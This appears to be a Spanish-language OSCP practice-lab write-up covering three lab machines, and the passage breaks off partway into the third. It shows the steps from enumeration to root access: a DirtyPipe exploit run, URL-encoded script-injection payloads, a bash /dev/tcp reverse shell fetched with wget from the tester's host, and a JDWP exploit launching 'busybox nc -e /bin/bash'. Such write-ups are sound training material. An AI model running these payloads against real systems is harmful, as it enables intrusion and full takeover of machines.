┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/Standalone-Machines]
└─# cat general-results.txt 
# Nmap 7.95 scan initiated Thu Aug 14 11:21:15 2025 as: /usr/lib/nmap/nmap -A -oN general-results.txt 192.168.116.149 192.168.116.150 192.168.116.151

# .149
Nmap scan report for 192.168.116.149
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5c:5f:f1:bb:02:f9:14:7c:8e:38:32:2b:f4:bc:d0:8c (RSA)
|   256 18:e2:47:e1:c8:40:a1:d0:2c:a5:87:97:bd:01:12:27 (ECDSA)
|_  256 26:2d:98:d9:47:6d:22:5d:4a:14:7a:24:5c:98:a2:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   168.47 ms 192.168.45.1
2   168.43 ms 192.168.45.254
3   168.53 ms 192.168.251.1
4   168.61 ms 192.168.116.149

# .150
Nmap scan report for 192.168.116.150
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
|_  256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
|_http-favicon: Spring Java Framework
|_http-open-proxy: Proxy might be redirecting requests
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.116.149
4   168.59 ms 192.168.116.150

# .151
Nmap scan report for 192.168.116.151
Host is up (0.16s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
80/tcp   open  http             Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| ssl-cert: Subject: commonName=OSCP
| Not valid before: 2025-08-13T12:46:14
|_Not valid after:  2026-02-12T12:46:14
|_ssl-date: 2025-08-14T14:22:19+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: OSCP
|   DNS_Computer_Name: OSCP
|   Product_Version: 10.0.19041
|_  System_Time: 2025-08-14T14:22:14+00:00
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (92%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (92%), Microsoft Windows 10 1909 - 2004 (85%), Windows Server 2019 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.116.149
4   201.00 ms 192.168.116.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 14 11:22:22 2025 -- 3 IP addresses (3 hosts up) scanned in 67.40 seconds
```

## .149 KIERO

### Enumeracion

```bash
┌──(root㉿kali)-[/home/…/5_OSCP-B/Standalone-Machines/149/snmp_192.168.193.149_loot]
└─# snmpwalk -v2c -c public 192.168.193.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value
```

* Usuarios:

```bash
john
kiero
```
* Como dice el mensaje anterior probamos credenciales por defecto del usuario **kiero**
```bash
kiero:kiero
```
* Entramos al servidor FTP

```bash
┌──(root㉿kali)-[/home/…/5_OSCP-B/Standalone-Machines/149/snmp_192.168.193.149_loot]
└─# ftp 192.168.193.149
Connected to 192.168.193.149.
220 (vsFTPd 3.0.3)
Name (192.168.193.149:kali): kiero
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||10100|)
150 Here comes the directory listing.
-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2
226 Directory send OK.
ftp> help
Commands may be abbreviated.  Commands are:

!               edit            lpage           nlist           rcvbuf          struct
$               epsv            lpwd            nmap            recv            sunique
account         epsv4           ls              ntrans          reget           system
append          epsv6           macdef          open            remopts         tenex
ascii           exit            mdelete         page            rename          throttle
bell            features        mdir            passive         reset           trace
binary          fget            mget            pdir            restart         type
bye             form            mkdir           pls             rhelp           umask
case            ftp             mls             pmlsd           rmdir           unset
cd              gate            mlsd            preserve        rstatus         usage
cdup            get             mlst            progress        runique         user
chmod           glob            mode            prompt          send            verbose
close           hash            modtime         proxy           sendport        xferbuf
cr              help            more            put             set             ?
debug           idle            mput            pwd             site
delete          image           mreget          quit            size
dir             lcd             msend           quote           sndbuf
disconnect      less            newer           rate            status
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||10092|)
150 Opening BINARY mode data connection for id_rsa (2590 bytes).
100% |*****************************************************************|  2590       29.40 MiB/s    00:00 ETA
226 Transfer complete.
2590 bytes received in 00:00 (12.37 KiB/s)
ftp> get id_rsa_2
local: id_rsa_2 remote: id_rsa_2
229 Entering Extended Passive Mode (|||10099|)
150 Opening BINARY mode data connection for id_rsa_2 (2635 bytes).
100% |*****************************************************************|  2635       23.70 MiB/s    00:00 ETA
226 Transfer complete.
2635 bytes received in 00:00 (12.58 KiB/s)
ftp> get id_rsa.pub
local: id_rsa.pub remote: id_rsa.pub
229 Entering Extended Passive Mode (|||10092|)
150 Opening BINARY mode data connection for id_rsa.pub (563 bytes).
100% |*****************************************************************|   563        6.97 MiB/s    00:00 ETA
226 Transfer complete.
563 bytes received in 00:00 (2.68 KiB/s)
ftp> 
```

* Nos conectamos por ssh.

> Revisamos id_rsa.pub y encontramos a **john**

* Nos conectamos con id_rsa:

```bash
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/149]
└─# ssh -i id_rsa john@192.168.193.149 
Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
john@oscp:~$ ls
RESET_PASSWD  local.txt
john@oscp:~$ cat local.txt
9efc78cf2b59a9438d28fae78b4297e0

john@oscp:~$ uname -a
Linux oscp 5.9.0-050900-generic #202010112230 SMP Sun Oct 11 22:34:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
john@oscp:~$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.5 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.5 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
john@oscp:~$ cat /etc/issue
Ubuntu 20.04.5 LTS \n \l

john@oscp:~$ arch
x86_64

```
> Debido a este error

```bash
john@oscp:~$ ./pspy64 
./pspy64: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./pspy64)
./pspy64: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./pspy64)
```

Seguimos las instrucciones de este [repo](https://github.com/X0RW3LL/XenSpawn)

#### Escalamos privilegios con dirtypipe


1. Buscamos y hacemos un mirror del exploit en el contenedor para compilarlo dentro de este
```bash
┌──(root㉿kali)-[/var/lib/machines/Kiero/root]
└─# searchsploit "dirty"                 
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page | linux/dos/43199.c
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page | linux/dos/44305.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' R | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condit | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condi | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Con | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condit | linux/local/40611.c
Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe | linux/local/50808.c
Qualcomm Android - Kernel Use-After-Free via Incorrect set_page_di | android/dos/46941.txt
Quick and Dirty Blog (qdblog) 0.4 - 'categories.php' Local File In | php/webapps/4603.txt
Quick and Dirty Blog (qdblog) 0.4 - SQL Injection / Local File Inc | php/webapps/3729.txt
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1 | linux/local/46361.py
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2 | linux/local/46362.py
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                     
┌──(root㉿kali)-[/var/lib/machines/Kiero/root]
└─# searchsploit -m 50808
  Exploit: Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)
      URL: https://www.exploit-db.com/exploits/50808
     Path: /usr/share/exploitdb/exploits/linux/local/50808.c
    Codes: CVE-2022-0847
 Verified: False
File Type: C source, ASCII text
Copied to: /var/lib/machines/Kiero/root/50808.c

┌──(root㉿kali)-[/var/lib/machines/Kiero/root]
└─# systemd-nspawn -M Kiero
░ Spawning container Kiero on /var/lib/machines/Kiero.
░ Press Ctrl-] three times within 1s to kill container.
root@Kiero:~# gcc -pthread 50808.c -o dirty -lcrypt
root@Kiero:~# ll
total 56
drwx------  2 root root  4096 Aug 23 18:50 ./
drwxr-xr-x 23 root root  4096 Aug 23 18:38 ../
-rw-r--r--  1 root root    18 Aug 23 18:29 .bash_aliases
-rw-------  1 root root   221 Aug 23 18:47 .bash_history
-rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root  7297 Aug 23 18:48 50808.c
-rwxr-xr-x  1 root root 14184 Aug 23 18:50 dirty*
-rw-r--r--  1 root root  4371 Aug 23 18:45 exploit.c
root@Kiero:~# exit
logout
Container Kiero exited successfully.
```

2. Explotamos 

```bash
john@oscp:~$ wget http://192.168.45.152:8000/dirty
--2025-08-23 22:05:03--  http://192.168.45.152:8000/dirty
Connecting to 192.168.45.152:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14184 (14K) [application/octet-stream]
Saving to: ‘dirty’

dirty                                                100%[====================================================================================================================>]  13.85K  80.7KB/s    in 0.2s    

2025-08-23 22:05:04 (80.7 KB/s) - ‘dirty’ saved [14184/14184]

john@oscp:~$ chmod +x dirty

john@oscp:~$ find / -perm -4000 2>/dev/null
/home/john/RESET_PASSWD
/usr/bin/mount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
/usr/bin/chfn
/usr/bin/at
/usr/bin/sudo

john@oscp:~$ ./dirty /usr/bin/su
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami
root
# cd /root
# ls
proof.txt  snap
# cat proof.txt
04e8ca871e390b36557157d57ff2776d
# 
```

## .150 BERLIN

#### Enumeracion

* **Nmap**

```bash
# Nmap 7.95 scan initiated Thu Aug 14 15:36:54 2025 as: /usr/lib/nmap/nmap -A -sS -oN 150-nmap.txt 192.168.116.150
Nmap scan report for 192.168.116.150
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
|_  256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
|_http-favicon: Spring Java Framework
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   229.41 ms 192.168.45.1
2   229.37 ms 192.168.45.254
3   229.44 ms 192.168.251.1
4   229.50 ms 192.168.116.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

* **Gobuster**

```bash
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
└─# gobuster dir -u http://192.168.249.150:8080 -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.249.150:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/?:                   (Status: 200) [Size: 19]
/error                (Status: 500) [Size: 105]
/pixels[]             (Status: 400) [Size: 800]
/search               (Status: 200) [Size: 25]
/error                (Status: 500) [Size: 105]
/favicon.ico          (Status: 200) [Size: 946]
/search               (Status: 200) [Size: 25]
Progress: 12334 / 12335 (99.99%)
===============================================================                                                                                                                                                   
Finished                                                                                                                                                                                                          
=============================================================== 
```

* **Exploit (PoC) ping to kali**

```bash
http://192.168.249.150:8080/search/?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27ping%20-c%201%20192.168.45.152%27%29%7D
```

* **Monitoreo**
```bash
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:57:13.177937 IP 192.168.249.150 > 192.168.45.152: ICMP echo request, id 1, seq 1, length 64
01:57:13.177967 IP 192.168.45.152 > 192.168.249.150: ICMP echo reply, id 1, seq 1, length 64
```

#### Reverse Shell

1. Generamos un shell.sh y lo servimos en el puerto 80
```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.152/4444 0>&1
```
* Servidor **puerto 80**

> Luego de ejcutar el siguiente comando

```bash
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.249.150 - - [24/Aug/2025 02:23:53] "GET /shell.sh HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

2. Lo subimos

```bash
http://192.168.249.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27wget%20192.168.45.152%2Fshell.sh%20-O%20%2Ftmp%2Fshell.sh%27%29%7D
```
3. Lo ejecutamos con el receptor corriendo

```bash
http://192.168.249.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27bash%20%2Ftmp%2Fshell.sh%27%29%7D
```

4. Receptor

```bash
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.249.150] 58714
bash: cannot set terminal process group (791): Inappropriate ioctl for device
bash: no job control in this shell
dev@oscp:/home$ whoami
whoami
dev
dev@oscp:/home$ cd dev
cd dev
dev@oscp:~$ ls
ls
local.txt
dev@oscp:~$ cat local.txt
cat local.txt
83116aa0059a6382ace97a71c940a125
dev@oscp:~$
```

#### Escalamos privilegios

1. Cargamos y ejecutamos un suggester

```bash
dev@oscp:~$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
<ggester/master/linux-exploit-suggester.sh -O les.sh
--2025-08-24 14:29:36--  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 90858 (89K) [text/plain]
Saving to: ‘les.sh’

     0K .......... .......... .......... .......... .......... 56% 25.0M 0s
    50K .......... .......... .......... ........             100%  139M=0.002s

2025-08-24 14:29:36 (39.0 MB/s) - ‘les.sh’ saved [90858/90858]

dev@oscp:~$ chmod +x les.sh
chmod +x les.sh
dev@oscp:~$ ls
ls
les.sh
local.txt
dev@oscp:~$ ./les.sh
./les.sh

Available information:

Kernel version: 5.15.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 22.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: probable
   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

```

* Conexiones en proceso:

```bash
dev@oscp:~$ netstat -tulnp 
netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      791/java            
udp        0      0 127.0.0.53:53           0.0.0.0:*
```
----

```bash
dev@oscp:/$ ps -ef | grep 8000
ps -ef | grep 8000
root         808       1  0 18:33 ?        00:00:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
dev         1238    1228  0 18:39 ?        00:00:00 grep --color=auto 8000
```

### SSH Local Port Forwarding:

1. Generamos en kali un id_rsa
```bash
ssh-keygen -t rsa -b 4096 -f id_rsa_dev
```

2. En la maquina victima dev@192.168.246.150 copiamos el id_rsa_dev.pub

```bash
mkdir -p /home/dev/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> /home/dev/.ssh/authorized_keys
chmod 700 /home/dev/.ssh
chmod 600 /home/dev/.ssh/authorized_keys
chown -R dev:dev /home/dev/.ssh
```

3. Nos conectamos

```bash
ssh -i id_rsa_dev dev@192.168.149.150 -L 8000:127.0.0.1:8000

```

4. Probamos:

```bash
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
└─# nmap -sV -p 8000 127.0.0.1
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-25 16:19 -03
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00010s latency).

PORT     STATE SERVICE VERSION
8000/tcp open  jdwp    unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.84 seconds
```

* Nos conectamos a dev@oscp con ssh

```bash
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Berlin]
└─# ssh -i id_rsa_dev dev@192.168.246.150 -L 8000:127.0.0.1:8000
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Aug 25 07:56:29 PM UTC 2025

  System load:  0.0                Processes:               202
  Usage of /:   47.8% of 13.67GB   Users logged in:         0
  Memory usage: 20%                IPv4 address for ens160: 192.168.246.150
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Aug 25 19:13:34 2025 from 192.168.45.152
```

* Antes de ejecutar el exploit revisamos puertos:

```bash
dev@oscp:~$ ss -ltnp
State   Recv-Q  Send-Q    Local Address:Port     Peer Address:Port  Process                          
LISTEN  0       4096      127.0.0.53%lo:53            0.0.0.0:*                                      
LISTEN  0       128             0.0.0.0:22            0.0.0.0:*                                      
LISTEN  0       1             127.0.0.1:8000          0.0.0.0:*                                      
LISTEN  0       50                    *:5000                *:*                                      
LISTEN  0       100                   *:8080                *:*      users:(("java",pid=791,fd=11))  
LISTEN  0       128                [::]:22               [::]:* 
```

* Buscamos busybox

```bash
dev@oscp:~$ which busybox 
/usr/bin/busybox
```

> Busqueda en google rapida: **"Linux Privilege Escalation jdwp"**

* [How to](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol.html) [Exploit](https://github.com/hugsy/jdwp-shellifier)

* Ejecutamos el exploit en kali:

```bash
┌──(root㉿kali)-[/home/…/5_OSCP-B/Standalone-Machines/Berlin/jdwp-shellifier]
└─# python3 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.152 9001 -e /bin/bash"
[+] Target: 127.0.0.1:8000
[*] Trying to connect...
[+] Connection successful!
[+] Handshake sent
[+] Handshake successful
[*] Requesting ID sizes from the JDWP server...
        • fieldIDSize: 8
        • methodIDSize: 8
        • objectIDSize: 8
        • referenceTypeIDSize: 8
        • frameIDSize: 8
[+] ID sizes have been successfully received and set.
[*] Requesting version information from the JDWP server...
        • description: Java Debug Wire Protocol (Reference Implementation) version 11.0
JVM Debug Interface version 11.0
JVM version 11.0.16 (OpenJDK 64-Bit Server VM, mixed mode, sharing)
        • jdwpMajor: 11
        • jdwpMinor: 0
        • vmVersion: 11.0.16
        • vmName: OpenJDK 64-Bit Server VM
[+] Version information has been successfully received and set.
[+] Found Runtime class: id=0x8b1
[+] Found Runtime.getRuntime(): id=0x7ff92402e108
[+] Created break event id=0x2
[+] Resume VM signal sent
[+] Waiting for an event on 'accept'
[*] Go triggering the corresponding ServerSocket (e.g., 'nc ip 5000 -z')
```

* Levantamos un receptor nc:

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 9001

listening on [any] 9001 ...
```

* Ejecutamos en **dev@oscp**

```bash
dev@oscp:~$ nc 127.0.0.1 5000 -z
```
* Veremos movimiento en la consola del exploit y en el receptor:

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 9001

listening on [any] 9001 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.246.150] 38484
whoami
root
cd /root
ls
proof.txt
snap
cat proof.txt
c25fbdc2b313fbbe2477a910532c9428 
```

## .151 GUST

#### Resultados del escaneo Nmap – 192.168.xxx.151

| Puerto       | Estado | Servicio         | Versión / Información detectada                                                                                                                                                                                                                                               |
| ------------ | ------ | ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **80/tcp**   | open   | http             | Microsoft IIS httpd 10.0<br>• http-title: *IIS Windows*<br>• Server header: *Microsoft-IIS/10.0*<br>• Métodos HTTP: TRACE (riesgoso)                                                                                                                                          |
